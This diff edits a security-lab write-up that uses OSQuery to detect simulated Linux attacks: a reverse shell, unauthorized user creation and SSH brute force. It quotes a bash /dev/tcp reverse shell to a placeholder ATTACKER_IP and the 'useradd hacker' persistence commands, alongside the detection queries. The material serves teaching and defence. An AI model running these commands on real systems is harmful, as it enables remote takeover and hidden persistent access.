@@ -75,7 +75,9 @@ Linux Logs – Security investigation
 Attacks Simulated-
 
 1. Reverse Shell Attack-
+   
 A reverse shell allows the attacker to control the victim system remotely.
+
 Example reverse shell command used by attacker:
 
 bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
@@ -89,30 +91,43 @@ Unusual network connections
 OSQuery Detection Query-
 
 SELECT pid,name,cmdline 
+
 FROM processes
+
 WHERE cmdline LIKE '%/dev/tcp%';
+
 This query helps identify processes that may be used for reverse shell connections.
 
 2. Reverse Shell with Unauthorized User Creation-
+   
 After gaining access through a reverse shell, the attacker creates a new user account to maintain persistence.
 
 Example commands used by attacker:
+
 useradd hacker
+
 passwd hacker
 
 Detection Query
+
 SELECT * FROM users;
+
 Security analysts can check if any new or suspicious user accounts are created.
 
 3. SSH Brute Force Attack-
+   
 In this attack, the attacker tries multiple passwords to log into the system through SSH.
 
 Detection Focus-
+
 Multiple login failures
+
 Suspicious login attempts
 
 Investigation Query-
+
 SELECT * FROM last;
+
 Analysts can also review authentication logs to detect repeated login failures.
 
 Investigation Process-
